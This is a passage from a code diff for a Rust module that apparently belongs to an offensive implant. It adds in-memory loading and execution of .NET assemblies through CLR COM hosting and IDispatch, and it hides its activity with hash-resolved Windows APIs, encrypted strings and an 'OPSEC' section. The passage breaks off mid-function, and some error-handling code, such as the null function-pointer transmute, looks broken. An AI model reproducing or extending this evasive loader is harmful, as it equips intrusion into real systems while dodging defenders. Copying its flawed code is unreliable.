@@ -29,7 +29,16 @@
 //!     → pick latest v4.x runtime
 //!       → ICLRRuntimeInfo::GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost)
 //!         → ICLRRuntimeHost::Start()
-//!           → ICLRRuntimeHost::ExecuteInDefaultAppDomain(assembly, type, method, args)
+//!
+//! In-memory path (preferred):
+//!   ICLRRuntimeInfo::GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost)
+//!     → ICorRuntimeHost::GetDefaultDomain()
+//!       → IDispatch::AppDomain.Load_3(SAFEARRAY<byte>)
+//!         → IDispatch::Assembly.EntryPoint
+//!           → IDispatch::MethodInfo.Invoke_2(null, args)
+//!
+//! File-based fallback (when in-memory unavailable):
+//!   → ICLRRuntimeHost::ExecuteInDefaultAppDomain(assembly, type, method, args)
 //! ```
 //!
 //! # OPSEC
@@ -117,6 +126,7 @@ type FnCoInitializeEx = unsafe extern "system" fn(LPVOID, DWORD) -> HRESULT;
 type FnCreateEventW = unsafe extern "system" fn(
     *mut SECURITY_ATTRIBUTES, DWORD, DWORD, LPCWSTR,
 ) -> HANDLE;
+type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
 
 /// Resolve a function pointer by DLL hash and function-name hash.
 ///
@@ -257,6 +267,285 @@ struct ICLRRuntimeHost {
     vtable: *const ICLRRuntimeHostVtable,
 }
 
+// ── ICorRuntimeHost (.NET 2.0 compatible hosting) ───────────────────────────
+//
+// Unlike ICLRRuntimeHost (v4), ICorRuntimeHost exposes GetDefaultDomain()
+// which returns the default AppDomain as an IUnknown pointer.  We QI for
+// IDispatch and use late binding to call AppDomain.Load_3(byte[]), which
+// loads an assembly from memory without touching disk.
+//
+// The v4 runtime supports the v2 hosting interface for backward compat, so
+// we can obtain this via ICLRRuntimeInfo::GetInterface alongside
+// ICLRRuntimeHost.
+
+const CLSID_COR_RUNTIME_HOST: GUID = GUID {
+    data1: 0xCB2F6722,
+    data2: 0xAB3A,
+    data3: 0x11D2,
+    data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
+};
+
+const IID_ICOR_RUNTIME_HOST: GUID = GUID {
+    data1: 0xCB2F6723,
+    data2: 0xAB3A,
+    data3: 0x11D2,
+    data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
+};
+
+#[repr(C)]
+struct ICorRuntimeHostVtable {
+    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
+    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
+    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
+    create_domain: unsafe extern "system" fn(
+        *mut c_void,      // this
+        LPCWSTR,          // pwzFriendlyName
+        *mut c_void,      // pIdentityArray (IUnknown*)
+        *mut *mut c_void, // ppAppDomain (IUnknown**)
+    ) -> HRESULT,
+    get_default_domain: unsafe extern "system" fn(
+        *mut c_void,      // this
+        *mut *mut c_void, // ppAppDomain (IUnknown**)
+    ) -> HRESULT,
+}
+
+#[repr(C)]
+struct ICorRuntimeHost {
+    vtable: *const ICorRuntimeHostVtable,
+}
+
+// ── IDispatch (COM late binding) ─────────────────────────────────────────────
+//
+// Used to call managed methods (AppDomain.Load_3, Assembly.EntryPoint,
+// MethodInfo.Invoke_2) without needing the exact vtable layout of managed
+// COM interfaces (~60 methods for _AppDomain).  The CLR's COM Callable
+// Wrapper (CCW) natively supports IDispatch.
+
+const IID_IDISPATCH: GUID = GUID {
+    data1: 0x00020400,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
+};
+
+#[repr(C)]
+struct IDispatchVtable {
+    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
+    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
+    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
+    get_type_info_count: unsafe extern "system" fn(*mut c_void, *mut u32) -> HRESULT,
+    get_type_info:
+        unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut c_void) -> HRESULT,
+    get_ids_of_names: unsafe extern "system" fn(
+        *mut c_void,    // this
+        REFIID,         // riid
+        *const LPCWSTR, // rgszNames
+        u32,            // cNames
+        u32,            // lcid
+        *mut i32,       // rgDispId
+    ) -> HRESULT,
+    invoke: unsafe extern "system" fn(
+        *mut c_void,    // this
+        i32,            // dispIdMember
+        REFIID,         // riid
+        u32,            // lcid
+        u16,            // wFlags
+        *mut DISPPARAMS,// pDispParams
+        *mut VARIANT,   // pVarResult
+        *mut EXCEPINFO, // pExcepInfo
+        *mut u32,       // puArgErr
+    ) -> HRESULT,
+}
+
+#[repr(C)]
+struct IDispatch {
+    vtable: *const IDispatchVtable,
+}
+
+// ── VARIANT / DISPPARAMS / EXCEPINFO ─────────────────────────────────────────
+
+const VT_EMPTY: u16 = 0x0000;
+const VT_NULL: u16 = 0x0001;
+const VT_I4: u16 = 0x0003;
+const VT_BSTR: u16 = 0x0008;
+const VT_DISPATCH: u16 = 0x0009;
+const VT_UNKNOWN: u16 = 0x000D;
+const VT_UI1: u16 = 0x0011;
+const VT_VARIANT: u16 = 0x000C;
+const VT_ARRAY: u16 = 0x2000;
+const VT_BYREF: u16 = 0x4000;
+
+const DISPATCH_METHOD: u16 = 0x0001;
+const DISPATCH_PROPERTYGET: u16 = 0x0002;
+const DISPID_PROPERTYPUT: i32 = -3;
+const LOCALE_USER_DEFAULT: u32 = 0x0400;
+
+/// Null GUID for IDispatch calls (riid parameter is reserved and must be
+/// IID_NULL per MSDN).
+const IID_NULL: GUID = GUID {
+    data1: 0x00000000,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
+};
+
+/// OLE Automation VARIANT union — 16 bytes on x64 (largest member is the
+/// record struct with two pointers: pvRecord + pRecInfo).
+#[repr(C)]
+#[derive(Copy, Clone)]
+union VARIANTData {
+    ll_val: i64,
+    l_val: i32,
+    ul_val: u32,
+    i_val: i16,
+    bool_val: i16,
+    scode: i32,
+    flt_val: f32,
+    dbl_val: f64,
+    bstr_val: *mut u16,
+    punk_val: *mut c_void,
+    pdisp_val: *mut c_void,
+    parray: *mut c_void,
+    byref: *mut c_void,
+    _record: [u64; 2],
+}
+
+impl Copy for VARIANTData {}
+impl Clone for VARIANTData {
+    fn clone(&self) -> Self {
+        *self
+    }
+}
+
+/// OLE Automation VARIANT — 24 bytes on x64 (8-byte header + 16-byte union).
+#[repr(C)]
+struct VARIANT {
+    vt: u16,
+    w_reserved1: u16,
+    w_reserved2: u16,
+    w_reserved3: u16,
+    data: VARIANTData,
+}
+
+impl VARIANT {
+    fn empty() -> Self {
+        VARIANT {
+            vt: VT_EMPTY,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { ll_val: 0 },
+        }
+    }
+
+    fn null() -> Self {
+        VARIANT {
+            vt: VT_NULL,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { ll_val: 0 },
+        }
+    }
+
+    fn from_i4(val: i32) -> Self {
+        VARIANT {
+            vt: VT_I4,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { l_val: val },
+        }
+    }
+
+    fn from_dispatch(disp: *mut IDispatch) -> Self {
+        VARIANT {
+            vt: VT_DISPATCH,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData {
+                pdisp_val: disp as *mut c_void,
+            },
+        }
+    }
+
+    fn from_safe_array(sa: *mut c_void) -> Self {
+        VARIANT {
+            vt: VT_ARRAY | VT_UI1,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { parray: sa },
+        }
+    }
+
+    fn from_safe_array_bstr(sa: *mut c_void) -> Self {
+        VARIANT {
+            vt: VT_ARRAY | VT_BSTR,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { parray: sa },
+        }
+    }
+
+    fn from_safe_array_variant(sa: *mut c_void) -> Self {
+        VARIANT {
+            vt: VT_ARRAY | VT_VARIANT,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { parray: sa },
+        }
+    }
+}
+
+unsafe impl Send for VARIANT {}
+unsafe impl Sync for VARIANT {}
+
+#[repr(C)]
+struct DISPPARAMS {
+    rgvarg: *mut VARIANT,
+    rgdispid_named_args: *mut i32,
+    c_args: u32,
+    c_named_args: u32,
+}
+
+#[repr(C)]
+struct EXCEPINFO {
+    w_code: u16,
+    w_reserved: u16,
+    bstr_source: *mut u16,
+    bstr_description: *mut u16,
+    bstr_help_file: *mut u16,
+    dw_help_context: u32,
+    pv_reserved: *mut c_void,
+    pfn_deferred_fill_in: Option<unsafe extern "system" fn(*mut EXCEPINFO) -> HRESULT>,
+    scode: i32,
+}
+
+// ── OLEAUT32 function pointer types ──────────────────────────────────────────
+
+type FnSafeArrayCreateVector = unsafe extern "system" fn(
+    u16,         // vt (element type)
+    i32,         // lLbound (lower bound)
+    u32,         // cElements (count)
+) -> *mut c_void; // SAFEARRAY*
+
+type FnSafeArrayAccessData =
+    unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT;
+
+type FnSafeArrayUnaccessData = unsafe extern "system" fn(*mut c_void) -> HRESULT;
+
+type FnSafeArrayDestroy = unsafe extern "system" fn(*mut c_void) -> HRESULT;
+
+type FnSysAllocString = unsafe extern "system" fn(*const u16) -> *mut u16; // BSTR
+
+type FnSysFreeString = unsafe extern "system" fn(*mut u16);
+
+type FnVariantClear = unsafe extern "system" fn(*mut VARIANT) -> HRESULT;
+
 // ── CLRCreateInstance function signature ─────────────────────────────────────
 
 type FnCLRCreateInstance =
@@ -270,6 +559,9 @@ struct ClrHostState {
     mscoree: HMODULE,
     /// Pointer to the ICLRRuntimeHost COM interface.
     runtime_host: *mut ICLRRuntimeHost,
+    /// Pointer to the ICorRuntimeHost COM interface (for in-memory loading).
+    /// May be null if the v2 hosting interface is unavailable.
+    cor_host: *mut ICorRuntimeHost,
     /// Function pointer for CLRCreateInstance.
     create_instance_fn: Option<FnCLRCreateInstance>,
     /// Timestamp (via `Instant::now()`) of the last execution.
@@ -347,19 +639,207 @@ unsafe fn read_pipe_to_vec(handle: HANDLE, buf: &mut Vec<u8>) -> bool {
     true
 }
 
+// ── OLEAUT32 helpers for SAFEARRAY / IDispatch ───────────────────────────────
+
+/// Resolve an oleaut32.dll function by name hash (no IAT entry).
+unsafe fn resolve_oleaut32_fn<T>(name: &[u8]) -> Option<T> {
+    let load_library_w: FnLoadLibraryW = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"LoadLibraryW\0"),
+    )?;
+    let oleaut32_name = string_crypt::enc_wstr!("oleaut32.dll");
+    let oleaut32 = load_library_w(oleaut32_name.as_ptr());
+    if oleaut32.is_null() {
+        return None;
+    }
+    let proc = pe_resolve::get_proc_address_by_hash(
+        oleaut32 as usize,
+        pe_resolve::hash_str(name),
+    )?;
+    Some(std::mem::transmute_copy(&proc))
+}
+
+/// Create a SAFEARRAY of VT_UI1 (byte array) from raw bytes.
+/// Returns a SAFEARRAY pointer that must be destroyed with SafeArrayDestroy.
+unsafe fn safe_array_from_bytes(data: &[u8]) -> Result<*mut c_void, String> {
+    let create_vector: FnSafeArrayCreateVector = resolve_oleaut32_fn(b"SafeArrayCreateVector\0")
+        .ok_or("cannot resolve SafeArrayCreateVector from oleaut32")?;
+    let access_data: FnSafeArrayAccessData = resolve_oleaut32_fn(b"SafeArrayAccessData\0")
+        .ok_or("cannot resolve SafeArrayAccessData from oleaut32")?;
+    let unaccess_data: FnSafeArrayUnaccessData = resolve_oleaut32_fn(b"SafeArrayUnaccessData\0")
+        .ok_or("cannot resolve SafeArrayUnaccessData from oleaut32")?;
+
+    let sa = create_vector(VT_UI1, 0, data.len() as u32);
+    if sa.is_null() {
+        return Err("SafeArrayCreateVector returned null".to_string());
+    }
+    let mut pv: *mut c_void = std::ptr::null_mut();
+    let hr = access_data(sa, &mut pv);
+    if hr != S_OK || pv.is_null() {
+        let destroy: FnSafeArrayDestroy = resolve_oleaut32_fn(b"SafeArrayDestroy\0")
+            .unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
+        if !destroy as bool {
+            destroy(sa);
+        }
+        return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
+    }
+    std::ptr::copy_nonoverlapping(data.as_ptr(), pv as *mut u8, data.len());
+    unaccess_data(sa);
+    Ok(sa)
+}
+
+/// Create a SAFEARRAY of VT_VARIANT from a slice of VARIANTs.
+unsafe fn safe_array_from_variants(variants: &[VARIANT]) -> Result<*mut c_void, String> {
+    let create_vector: FnSafeArrayCreateVector = resolve_oleaut32_fn(b"SafeArrayCreateVector\0")
+        .ok_or("cannot resolve SafeArrayCreateVector from oleaut32")?;
+    let access_data: FnSafeArrayAccessData = resolve_oleaut32_fn(b"SafeArrayAccessData\0")
+        .ok_or("cannot resolve SafeArrayAccessData from oleaut32")?;
+    let unaccess_data: FnSafeArrayUnaccessData = resolve_oleaut32_fn(b"SafeArrayUnaccessData\0")
+        .ok_or("cannot resolve SafeArrayUnaccessData from oleaut32")?;
+
+    let sa = create_vector(VT_VARIANT, 0, variants.len() as u32);
+    if sa.is_null() {
+        return Err("SafeArrayCreateVector(VT_VARIANT) returned null".to_string());
+    }
+    let mut pv: *mut c_void = std::ptr::null_mut();
+    let hr = access_data(sa, &mut pv);
+    if hr != S_OK || pv.is_null() {
+        let destroy: FnSafeArrayDestroy = resolve_oleaut32_fn(b"SafeArrayDestroy\0")
+            .unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
+        if !destroy as bool {
+            destroy(sa);
+        }
+        return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
+    }
+    std::ptr::copy_nonoverlapping(
+        variants.as_ptr() as *const u8,
+        pv as *mut u8,
+        variants.len() * std::mem::size_of::<VARIANT>(),
+    );
+    unaccess_data(sa);
+    Ok(sa)
+}
+
+/// Destroy a SAFEARRAY.
+unsafe fn safe_array_destroy(sa: *mut c_void) {
+    if sa.is_null() { return; }
+    if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
+        destroy(sa);
+    }
+}
+
+/// Call IDispatch::GetIDsOfNames for a single method name.
+/// Returns the DISPID for the named method/property.
+unsafe fn dispatch_get_id(
+    dispatch: *mut IDispatch,
+    name: &[u16], // wide, null-terminated
+) -> Result<i32, String> {
+    let disp = &*dispatch;
+    let name_ptr: LPCWSTR = name.as_ptr();
+    let mut dispid: i32 = 0;
+    let hr = (disp.vtable.get_ids_of_names)(
+        dispatch as *mut c_void,
+        IID_NULL.as_ptr(),
+        &name_ptr,
+        1,
+        LOCALE_USER_DEFAULT,
+        &mut dispid,
+    );
+    if hr != S_OK {
+        return Err(format!(
+            "GetIDsOfNames failed for '{}': hr={:#010X}",
+            String::from_utf16_lossy(&name[..name.len().saturating_sub(1)]),
+            hr as u32
+        ));
+    }
+    Ok(dispid)
+}
+
+/// Call IDispatch::Invoke with the given parameters.
+/// Returns the result VARIANT (caller must VariantClear it).
+unsafe fn dispatch_invoke(
+    dispatch: *mut IDispatch,
+    dispid: i32,
+    w_flags: u16,
+    params: &mut DISPPARAMS,
+) -> Result<VARIANT, String> {
+    let disp = &*dispatch;
+    let mut result = VARIANT::empty();
+    let mut excep_info = std::mem::zeroed::<EXCEPINFO>();
+    let mut arg_err: u32 = 0;
+
+    let hr = (disp.vtable.invoke)(
+        dispatch as *mut c_void,
+        dispid,
+        IID_NULL.as_ptr(),
+        LOCALE_USER_DEFAULT,
+        w_flags,
+        params,
+        &mut result,
+        &mut excep_info,
+        &mut arg_err,
+    );
+    if hr != S_OK {
+        // Try to extract error description from EXCEPINFO.
+        let desc = if !excep_info.bstr_description.is_null() {
+            // BSTR is a length-prefixed wide string.  Read up to the first
+            // null or 256 chars for safety.
+            let mut chars = Vec::new();
+            let mut p = excep_info.bstr_description;
+            for _ in 0..256 {
+                if *p == 0 { break; }
+                chars.push(*p);
+                p = p.add(1);
+            }
+            // Free the BSTR
+            if let Some(sys_free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
+                sys_free(excep_info.bstr_description);
+            }
+            String::from_utf16_lossy(&chars)
+        } else {
+            format!("hr={:#010X}", hr as u32)
+        };
+        return Err(format!("IDispatch::Invoke(DISPID={}) failed: {}", dispid, desc));
+    }
+    Ok(result)
+}
+
+/// Clear a VARIANT (releases any held reference).
+unsafe fn variant_clear(var: &mut VARIANT) {
+    if let Some(clear) = resolve_oleaut32_fn::<FnVariantClear>(b"VariantClear\0") {
+        clear(var);
+    }
+}
+
+/// Allocate a BSTR from a null-terminated wide string.
+unsafe fn sys_alloc_string(s: &[u16]) -> *mut u16 {
+    match resolve_oleaut32_fn::<FnSysAllocString>(b"SysAllocString\0") {
+        Some(alloc) => alloc(s.as_ptr()),
+        None => std::ptr::null_mut(),
+    }
+}
+
+/// Free a BSTR.
+unsafe fn sys_free_string(s: *mut u16) {
+    if s.is_null() { return; }
+    if let Some(free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
+        free(s);
+    }
+}
+
 // ── CLR Host Initialization ──────────────────────────────────────────────────
 
 /// Initialize the CLR host.  Loads mscoree.dll, creates ICLRMetaHost,
 /// enumerates installed runtimes, picks the latest v4.x, and obtains
 /// ICLRRuntimeHost.
-unsafe fn init_clr_host() -> Result<*mut ICLRRuntimeHost, String> {
+unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost), String> {
     // ── Load mscoree.dll (dynamically resolved LoadLibraryW) ────────────
     let load_library_w: FnLoadLibraryW = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"LoadLibraryW\0"),
     ).ok_or("cannot resolve LoadLibraryW from kernel32")?;
 
-    let mscoree_name = to_wide("mscoree.dll");
+    let mscoree_name = string_crypt::enc_wstr!("mscoree.dll");
     let mscoree = load_library_w(mscoree_name.as_ptr());
     if mscoree.is_null() {
         return Err("failed to load mscoree.dll — .NET Framework may not be installed".to_string());
@@ -528,7 +1008,115 @@ unsafe fn init_clr_host() -> Result<*mut ICLRRuntimeHost, String> {
     }
 
     log::info!("[assembly_loader] CLR started successfully");
-    Ok(runtime_host_ptr as *mut ICLRRuntimeHost)
+
+    // ── Get ICorRuntimeHost (v2 hosting interface, available on v4 runtime) ──
+    //
+    // We need ICorRuntimeHost for GetDefaultDomain(), which returns an
+    // IUnknown pointer to the default AppDomain.  From there we use
+    // IDispatch late binding to call AppDomain.Load_3(byte[]) for in-memory
+    // assembly loading — no file on disk required.
+    //
+    // If this fails (unlikely on .NET Framework 4.x), we return null and
+    // fall back to the file-based ExecuteInDefaultAppDomain path.
+    let mut cor_host_ptr: LPVOID = std::ptr::null_mut();
+
+    // Re-create meta_host + enumerate to get a fresh runtime_info.  We
+    // released the earlier one after getting ICLRRuntimeHost.
+    let mut meta_host_ptr2: LPVOID = std::ptr::null_mut();
+    let hr2 = create_instance(
+        CLSID_CLR_META_HOST.as_clsid_ptr(),
+        IID_ICLR_META_HOST.as_ptr(),
+        &mut meta_host_ptr2,
+    );
+    if hr2 == S_OK && !meta_host_ptr2.is_null() {
+        let meta_host2 = &*(meta_host_ptr2 as *const ICLRMetaHost);
+        let iid_enum2 = GUID {
+            data1: 0x00000100,
+            data2: 0x0000,
+            data3: 0x0000,
+            data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
+        };
+        let mut enum_ptr2: LPVOID = std::ptr::null_mut();
+        let hr3 = (meta_host2.vtable.enumerate_installed_runtimes)(
+            meta_host_ptr2,
+            iid_enum2.as_ptr(),
+            &mut enum_ptr2,
+        );
+        if hr3 == S_OK && !enum_ptr2.is_null() {
+            let enumerator2 = &*(enum_ptr2 as *const IEnumUnknown);
+            // Re-enumerate to find the same best runtime.
+            let mut best_rt2: Option<*mut c_void> = None;
+            let mut best_ver2: u32 = 0;
+            loop {
+                let mut fetched: ULONG = 0;
+                let mut item: LPVOID = std::ptr::null_mut();
+                let hr = (enumerator2.vtable.next)(enum_ptr2, 1, &mut item, &mut fetched);
+                if hr != S_OK || fetched == 0 {
+                    break;
+                }
+                let ri = &*(item as *const ICLRRuntimeInfo);
+                let mut blen: DWORD = 128;
+                let mut vbuf = vec![0u16; blen as usize];
+                let hr = (ri.vtable.get_version_string)(
+                    item,
+                    vbuf.as_mut_ptr(),
+                    &mut blen,
+                    std::ptr::null_mut(),
+                );
+                if hr != S_OK {
+                    vbuf = vec![0u16; blen as usize];
+                    let _ = (ri.vtable.get_version_string)(
+                        item,
+                        vbuf.as_mut_ptr(),
+                        &mut blen,
+                        std::ptr::null_mut(),
+                    );
+                }
+                let vs = String::from_utf16_lossy(
+                    &vbuf[..blen as usize].iter().copied().filter(|&c| c != 0).collect::<Vec<u16>>(),
+                );
+                let nv = if vs.starts_with('v') || vs.starts_with('V') {
+                    let d: String = vs.trim_start_matches(|c: char| !c.is_ascii_digit())
+                        .chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
+                    parse_version_to_u32(&d)
+                } else { 0 };
+                if nv >= 4_000_000 && nv > best_ver2 {
+                    best_ver2 = nv;
+                    if let Some(old) = best_rt2.take() {
+                        let old_ri = &*(old as *const ICLRRuntimeInfo);
+                        (old_ri.vtable.release)(old);
+                    }
+                    best_rt2 = Some(item);
+                } else {
+                    (ri.vtable.release)(item);
+                }
+            }
+            (enumerator2.vtable.release)(enum_ptr2);
+            if let Some(rt2) = best_rt2 {
+                let ri2 = &*(rt2 as *const ICLRRuntimeInfo);
+                let hr = (ri2.vtable.get_interface)(
+                    rt2,
+                    CLSID_COR_RUNTIME_HOST.as_clsid_ptr(),
+                    IID_ICOR_RUNTIME_HOST.as_ptr(),
+                    &mut cor_host_ptr,
+                );
+                if hr == S_OK && !cor_host_ptr.is_null() {
+                    log::info!("[assembly_loader] ICorRuntimeHost obtained — in-memory loading available");
+                } else {
+                    log::warn!(
+                        "[assembly_loader] GetInterface(ICorRuntimeHost) failed: hr={:#010X} — will use file-based fallback",
+                        hr as u32
+                    );
+                    cor_host_ptr = std::ptr::null_mut();
+                }
+                (ri2.vtable.release)(rt2);
+            }
+        }
+        let mh2 = &*(meta_host_ptr2 as *const ICLRMetaHost);
+        (mh2.vtable.release)(meta_host_ptr2);
+    }
+
+    Ok((runtime_host_ptr as *mut ICLRRuntimeHost, cor_host_ptr as *mut ICorRuntimeHost))
 }
 
 /// Parse a version string like "4.0.30319.42000" into a u32 for comparison.
@@ -556,6 +1144,12 @@ unsafe fn teardown_clr_host(state: &mut ClrHostState) {
         (host.vtable.release)(state.runtime_host as *mut c_void);
         state.runtime_host = std::ptr::null_mut();
         log::info!("[assembly_loader] CLR host stopped and released");
+    }
+    if !state.cor_host.is_null() {
+        let cor = &*state.cor_host;
+        (cor.vtable.release)(state.cor_host as *mut c_void);
+        state.cor_host = std::ptr::null_mut();
+        log::info!("[assembly_loader] ICorRuntimeHost released");
     }
     if !state.mscoree.is_null() {
         // FreeLibrary would unload, but we don't want to call it explicitly —
@@ -954,6 +1548,427 @@ pub struct AssemblyResult {
     pub hresult: HRESULT,
 }
 
+// ── In-Memory Assembly Loading via IDispatch ─────────────────────────────────
+//
+// This function implements the in-memory path:
+//
+//   ICorRuntimeHost::GetDefaultDomain()
+//     → IUnknown → QI for IDispatch
+//       → AppDomain.Load_3(SAFEARRAY<byte>)  →  Assembly (IDispatch)
+//         → Assembly.EntryPoint               →  MethodInfo (IDispatch)
+//           → MethodInfo.Invoke_2(null, args) →  executes the entry point
+//
+// All COM calls use IDispatch late binding so we don't need the exact vtable
+// layout of managed COM callable wrappers (which have ~60 methods).
+
+/// Execute a .NET assembly in-memory using CLR COM hosting + IDispatch.
+///
+/// Returns `Ok(AssemblyResult)` on success, or `Err(msg)` if the in-memory
+/// path is unavailable or fails (caller should fall back to file-based).
+unsafe fn execute_in_memory_internal(
+    cor_host: *mut ICorRuntimeHost,
+    assembly_bytes: &[u8],
+    args: &[String],
+    timeout_secs: u64,
+) -> Result<AssemblyResult, String> {
+    let host = &*cor_host;
+
+    // ── 1. Get default AppDomain ────────────────────────────────────────
+    let mut appdomain_ptr: *mut c_void = std::ptr::null_mut();
+    let hr = (host.vtable.get_default_domain)(
+        cor_host as *mut c_void,
+        &mut appdomain_ptr,
+    );
+    if hr != S_OK || appdomain_ptr.is_null() {
+        return Err(format!(
+            "ICorRuntimeHost::GetDefaultDomain failed: hr={:#010X}",
+            hr as u32
+        ));
+    }
+    log::info!("[assembly_loader] in-memory: default AppDomain obtained");
+
+    // ── 2. QI AppDomain for IDispatch ───────────────────────────────────
+    let appdomain_dispatch = &*(appdomain_ptr as *const IDispatch);
+    let mut dispatch_ptr: LPVOID = std::ptr::null_mut();
+    let hr = (appdomain_dispatch.vtable.query_interface)(
+        appdomain_ptr,
+        IID_IDISPATCH.as_ptr(),
+        &mut dispatch_ptr,
+    );
+    if hr != S_OK || dispatch_ptr.is_null() {
+        // Release the appdomain IUnknown.
+        let unk = &*(appdomain_ptr as *const ICLRRuntimeHost); // reuse QI/AddRef/Release layout
+        (unk.vtable.release)(appdomain_ptr);
+        return Err(format!(
+            "AppDomain QI for IDispatch failed: hr={:#010X}",
+            hr as u32
+        ));
+    }
+    let appdomain = dispatch_ptr as *mut IDispatch;
+
+    // ── 3. Build SAFEARRAY<byte> from assembly bytes ────────────────────
+    let sa_bytes = safe_array_from_bytes(assembly_bytes)?;
+
+    // ── 4. Call AppDomain.Load_3(byte[]) → Assembly ─────────────────────
+    let load_name = to_wide("Load_3");
+    let dispid_load = dispatch_get_id(appdomain, &load_name)?;
+
+    let mut load_arg = VARIANT::from_safe_array(sa_bytes);
+    let mut load_params = DISPPARAMS {
+        rgvarg: &mut load_arg,
+        rgdispid_named_args: std::ptr::null_mut(),
+        c_args: 1,
+        c_named_args: 0,
+    };
+
+    let assembly_result = dispatch_invoke(appdomain, dispid_load, DISPATCH_METHOD, &mut load_params)?;
+    variant_clear(&mut load_arg);
+    safe_array_destroy(sa_bytes);
+
+    if assembly_result.vt != VT_DISPATCH && assembly_result.vt != VT_UNKNOWN {
+        let vt = assembly_result.vt;
+        variant_clear(&mut assembly_result);
+        // Release appdomain IDispatch.
+        let disp = &*appdomain;
+        (disp.vtable.release)(appdomain as *mut c_void);
+        // Release appdomain IUnknown.
+        let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
+        (unk.vtable.release)(appdomain_ptr);
+        return Err(format!(
+            "AppDomain.Load_3 returned unexpected VT: {:#06X} (expected VT_DISPATCH)",
+            vt
+        ));
+    }
+
+    let assembly_obj = assembly_result.data.pdisp_val;
+    let assembly_disp = assembly_obj as *mut IDispatch;
+    log::info!("[assembly_loader] in-memory: Assembly loaded from byte array");
+
+    // ── 5. Get Assembly.EntryPoint → MethodInfo ─────────────────────────
+    let ep_name = to_wide("EntryPoint");
+    let dispid_ep = dispatch_get_id(assembly_disp, &ep_name)?;
+
+    let mut ep_params = DISPPARAMS {
+        rgvarg: std::ptr::null_mut(),
+        rgdispid_named_args: std::ptr::null_mut(),
+        c_args: 0,
+        c_named_args: 0,
+    };
+
+    let ep_result = dispatch_invoke(assembly_disp, dispid_ep, DISPATCH_PROPERTYGET, &mut ep_params)?;
+
+    if ep_result.vt != VT_DISPATCH && ep_result.vt != VT_UNKNOWN {
+        let vt = ep_result.vt;
+        variant_clear(&mut ep_result);
+        variant_clear(&mut assembly_result);
+        let disp = &*appdomain;
+        (disp.vtable.release)(appdomain as *mut c_void);
+        let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
+        (unk.vtable.release)(appdomain_ptr);
+        return Err(format!(
+            "Assembly.EntryPoint returned unexpected VT: {:#06X}",
+            vt
+        ));
+    }
+
+    let method_info = ep_result.data.pdisp_val;
+    let method_disp = method_info as *mut IDispatch;
+    log::info!("[assembly_loader] in-memory: EntryPoint MethodInfo obtained");
+
+    // ── 6. Build args array for Invoke ──────────────────────────────────
+    // MethodInfo.Invoke_2(object obj, object[] parameters)
+    // For a static Main method, obj = null.
+    // The args parameter is a string[] on the managed side, which we pass
+    // as object[] of strings.
+
+    let arg_bstrs: Vec<*mut u16> = args.iter().map(|a| {
+        let wide = to_wide(a);
+        unsafe { sys_alloc_string(&wide) }
+    }).collect();
+
+    let mut arg_variants: Vec<VARIANT> = arg_bstrs.iter().map(|bstr| {
+        VARIANT {
+            vt: VT_BSTR,
+            w_reserved1: 0,
+            w_reserved2: 0,
+            w_reserved3: 0,
+            data: VARIANTData { bstr_val: *bstr },
+        }
+    }).collect();
+
+    let sa_args = if arg_variants.is_empty() {
+        std::ptr::null_mut()
+    } else {
+        safe_array_from_variants(&arg_variants)?
+    };
+
+    // ── 7. Set up pipe capture for stdout/stderr ────────────────────────
+    let create_pipe: FnCreatePipe = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"CreatePipe\0"),
+    ).ok_or("cannot resolve CreatePipe")?;
+
+    let mut sa = SECURITY_ATTRIBUTES {
+        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
+        lpSecurityDescriptor: std::ptr::null_mut(),
+        bInheritHandle: 1,
+    };
+
+    let mut stdout_read: HANDLE = std::ptr::null_mut();
